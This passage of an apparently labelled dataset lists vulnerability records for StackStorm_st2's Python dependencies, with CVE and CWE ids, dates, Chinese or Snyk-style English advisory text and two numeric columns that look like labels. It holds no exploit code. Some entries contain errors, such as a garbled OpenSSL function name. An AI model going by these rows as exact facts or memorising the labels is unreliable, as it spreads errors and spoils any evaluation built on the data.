- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
StackStorm_st2,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
StackStorm_st2,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
StackStorm_st2,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
StackStorm_st2,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
StackStorm_st2,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
StackStorm_st2,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
StackStorm_st2,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
StackStorm_st2,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
StackStorm_st2,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
StackStorm_st2,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
StackStorm_st2,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
StackStorm_st2,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
StackStorm_st2,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
StackStorm_st2,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
StackStorm_st2,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
StackStorm_st2,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
StackStorm_st2,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
StackStorm_st2,eventlet,,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,flex,,True,,CWE-94,2018-05-28,"## Overview
[`flex`](http://pypi.python.org/pypi/flex) is a Swagger Schema validation tool.

Affected versions of this package are vulnerable to Arbitrary Code Execution attacks. It used the unsafe `yaml.load` function to load YAML files.

## Remediation
Upgrade `flex` to verson 6.12.0 or higher.
## References
- [GitHub Changelog](https://github.com/pipermerriam/flex/blob/55822c2ffaa17dfa5e403d7feed898cb9bc983bb/CHANGELOG#L22)
",1,2
StackStorm_st2,gitpython,,True,,CWE-1333,2022-02-21,"## Overview
[GitPython](https://pypi.org/project/GitPython/) is a python library used to interact with Git repositories

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when a user controls the input passed to the pattern matching function.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `GitPython` to version 3.1.27 or higher.
## References
- [GitHub Commit](https://github.com/gitpython-developers/GitPython/commit/75f4f63ab3856a552f06082aabf98845b5fa21e3)
",3,0
StackStorm_st2,gitpython,,True,CVE-2024-22190,CWE-426,2024-01-10,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.40及之前版本存在代码问题漏洞，该漏洞源于允许攻击者通过不受信任的搜索路径执行任意代码。",2,0
StackStorm_st2,gitpython,,True,CVE-2023-40267,CWE-94,2023-08-11,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32之前版本存在安全漏洞，该漏洞源于没有阻止clone和clone_from中不安全的non-multi选项。",1,2
StackStorm_st2,gitpython,,True,CVE-2023-40590,CWE-426,2023-08-28,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在代码问题漏洞，该漏洞源于攻击者可以诱骗用户下载带有恶意git可执行文件的存储库，攻击者可以运行任何任意命令。",2,0
StackStorm_st2,gitpython,,True,CVE-2023-41040,CWE-22,2023-08-30,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在路径遍历漏洞，该漏洞源于为了解析一些 git 引用，GitPython 从目录中读取文件.git，在某些情况，GitPython 不会检查该文件是否位于目录之外.git，导致攻击者可以让 GitPython 从系统中读取任何文件。",3,0
StackStorm_st2,gitpython,,True,CVE-2022-24439,CWE-20,2022-12-06,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython存在安全漏洞，该漏洞源于不正确的用户输入验证，攻击者利用该漏洞可以远程代码执行。",1,1
StackStorm_st2,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
StackStorm_st2,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
StackStorm_st2,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
StackStorm_st2,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
StackStorm_st2,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
StackStorm_st2,jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
StackStorm_st2,jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
StackStorm_st2,jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
StackStorm_st2,jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
StackStorm_st2,jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
StackStorm_st2,jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
StackStorm_st2,jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
StackStorm_st2,jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
StackStorm_st2,jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
StackStorm_st2,jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
StackStorm_st2,networkx,,True,,CWE-502,2021-03-22,"## Overview
[networkx](https://pypi.org/project/networkx/) is a Python package for creating and manipulating graphs and networks

Affected versions of this package are vulnerable to Deserialization of Untrusted Data. This package is vulnerable to arbitrary code execution via insecure YAML deserialization due to the use of a known vulnerable function `load()` in yaml, which is called in `read_yaml()` in `networkx/readwrite/nx_yaml.py`.

`networkx/readwrite/nx_yaml.py` is deprecated and scheduled to be removed in the next release of Networkx. Users should avoid using this function completely.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.

_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.

Java deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.

  
An attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.
  

> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).

- Apache Blog
  
## Remediation
Upgrade `networkx` to version 2.6 or higher.
## References
- [GitHub PR](https://github.com/networkx/networkx/pull/4541)
",2,0
StackStorm_st2,orjson,,True,CVE-2024-27454,CWE-674,2024-02-26,"orjson是ijl个人开发者的一个快速、正确的 Python JSON 库。
orjson 3.9.15之前版本存在安全漏洞，该漏洞源于不限制深度嵌套JSON文档的递归。",2,2
StackStorm_st2,paramiko,,True,CVE-2018-7750,CWE-287,2018-03-13,<p>Paramiko是一个基于Python的SSH协议库。SSH server是其中的一个SSH服务器。 Paramiko中的SSH服务器实现的transport.py文件存在安全漏洞，该漏洞源于程序在处理其他请求之前没有正确的检测身份验证是否完成。攻击者可利用该漏洞绕过身份验证，以下版本受到影响：Paramiko 1.17.6之前版本，1.18.5之前的1.18.x版本，2.0.8之前的2.0.x版本，2.1.5之前的2.1.x版本，2.2.3之前的2.2.x版本，2.3.2之前的2.3.x版本，2.4.1之前的2.4.x版本。</p>,1,1
StackStorm_st2,paramiko,,True,CVE-2008-0299,CWE-200,2008-01-16,Paramiko 1.7.1及其早期版本中的common.py在运行线程或者交叉进程时，并不会正常使用随机区域。这使得一个会话可以通过对某一会话的状态预测来从另外一个会话获得敏感信息。,2,0
StackStorm_st2,paramiko,,True,CVE-2022-24302,CWE-362,2022-03-17,"Paramiko是一个 SSHv2 协议的纯 Python 实现。提供客户端和服务器功能。
Paramiko 2.10.1之前版本 存在安全漏洞，该漏洞源于write_private_key_file函数中的竞争条件（creation and chmod之间）允许未经授权的信息泄露。",2,0
StackStorm_st2,pip,,True,CVE-2019-20916,CWE-22,2020-09-04,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python pip 19.2之前版本中存在路径遍历漏洞。攻击者借助该漏洞可以进行目录遍历。",2,2
StackStorm_st2,pip,,True,CVE-2013-1888,CWE-59,2013-05-03,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。pip是一套用于安装和管理Python软件包的工具。
pip 1.3之前的版本中存在安全漏洞。本地攻击者可通过在/tmp/pip-build临时目录下的文件上实施符号链接攻击，利用该漏洞覆盖任意文件。",3,0
StackStorm_st2,pip,,True,CVE-2021-3572,CWE-20,2021-04-30,"Pip是一套用于安装和管理Python软件包的工具。
python pip 中存在输入验证错误漏洞，远程攻击者可能会利用该漏洞在存储库上安装不同的修订版。",2,2
StackStorm_st2,pip,,True,CVE-2023-5752,CWE-77,2023-10-24,"Pip是一套用于安装和管理Python软件包的工具。
pip v23.3之前版本存在安全漏洞，该漏洞源于存在注入任意配置选项调用。",3,0
StackStorm_st2,pip,,True,CVE-2013-5123,CWE-287,2015-07-31,Python 是一套由 Python 软件基金会开发的开源、面向对象的程序设计语言，以其可扩展性和对多种平台的支持而闻名。Pip 是用于安装和管理 Python 软件包的工具。Python Pip 在1.5之前的版本中存在安全漏洞，攻击者可以利用该漏洞绕过安全限制，执行未授权操作。这一漏洞的根本原因在于未适当实施的安全措施，导致安全限制可以被绕过。,2,1
StackStorm_st2,pip,,True,CVE-2013-1629,CWE-20,2013-08-06,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。pip是一款用于安装和管理Python软件包的工具。
Python的pip安装模块1.2.1及之前的版本中存在安全漏洞，该漏洞源于程序使用HTTP协议对PyPl存储库中的程序包进行检索时，没有对其内容进行完整性检查。中间人攻击者可通过‘pip install’操作利用该漏洞执行任意代码。",2,0
StackStorm_st2,pip,,True,CVE-2025-8869,CWE-59,2025-09-24,pip 是 Python 的包管理工具，广泛用于安装和管理 Python 包及其依赖。该漏洞涉及 pip 在提取 tar 文件时的回退实现，当 Python 版本未实现 PEP 706 时，pip 的实现可能不会检查符号链接是否指向提取目录，从而导致安全问题。PEP 706 是针对 Python tarfile 模块的安全增强提案，旨在解决 tar 文件解压过程中的多个已知漏洞。如果使用的 Python 版本未实现 PEP 706，pip 会使用存在漏洞的回退代码逻辑。漏洞成因主要是由于未对符号链接进行充分验证，攻击者可以利用该漏洞通过恶意构造的 tar 文件进行目录穿越攻击，访问或覆盖提取目录外的文件。,3,0
StackStorm_st2,prompt-toolkit,,True,,CWE-362,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Race Condition due to improper lock implementation in `ThreadedHistory` which could lead to a deadlock.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `prompt-toolkit` to version 3.0.13 or higher.
## References
- [GitHub Commit](https://github.com/prompt-toolkit/python-prompt-toolkit/commit/99092a8c6d4b411645ac4b84d504e5226e7eebb8#diff-48c0ff10dc3990285d19b3f54e6bfec763089ba1229dc6f9e88463a1046adad7R163)
",4,0
StackStorm_st2,psutil,,True,CVE-2019-18874,CWE-415,2019-11-11,"psutil是一款基于Python的进程和系统监视库。
psutil 5.65及之前版本中存在资源管理错误漏洞。远程攻击者可借助特制数据利用该漏洞导致应用程序崩溃（拒绝服务）。",2,2
StackStorm_st2,psutil,,True,,CWE-362,2023-11-01,"## Overview
[psutil](https://github.com/giampaolo/psutil) is a cross-platform lib for process and system monitoring in Python

Affected versions of this package are vulnerable to Race Condition in the `files/threads/connections` process.
## Remediation
Upgrade `psutil` to version 0.5.1 or higher.
## References
- [GitHub Commit](https://github.com/giampaolo/psutil/commit/163f29d25f4c5d573fbd436e658829afe95bc1d9)
",3,0
StackStorm_st2,pygments,,True,CVE-2022-40896,CWE-434,2023-07-02,"Matthäus G. Chajdas pygments是 Matthäus G. Chajdas开源的一个应用软件。提供通用语法突出显示工具功能。
pygments 2.15.0及之前版本存在安全漏洞，该漏洞源于pygments/lexers/smithy.py存在正则表达式拒绝服务（ReDoS）漏洞。",3,0
StackStorm_st2,pymongo,">=4.0.0,<4.7",True,,CWE-125,2024-05-31,,3,1
StackStorm_st2,pymongo,">=4.0.0,<4.7",True,CVE-2024-5629,CWE-125,2024-05-31,"PyMongo是MongoDB开源的一个官方 MongoDB Python 驱动程序。
PyMongo 4.6.2 版本及之前版本存在安全漏洞，该漏洞源于 bson 模块存在越界读取问题。",3,0
